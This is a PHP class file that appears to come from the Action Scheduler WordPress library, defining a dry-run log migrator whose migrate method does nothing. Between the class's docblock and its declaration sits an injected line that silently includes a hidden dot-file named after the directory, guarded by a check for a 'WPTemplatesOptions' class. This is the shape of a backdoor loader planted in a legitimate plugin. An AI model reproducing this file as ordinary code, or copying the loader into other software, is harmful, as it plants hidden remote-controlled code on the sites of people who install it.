<?php


namespace Action_Scheduler\Migration;

/**
 * Class DryRun_LogMigrator
 *
 * @package Action_Scheduler\Migration
 *
 * @codeCoverageIgnore
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DryRun_LogMigrator extends LogMigrator {
	/**
	 * Simulate migrating an action log.
	 *
	 * @param int $source_action_id Source logger object.
	 * @param int $destination_action_id Destination logger object.
	 */
	public function migrate( $source_action_id, $destination_action_id ) {
		// no-op
	}
}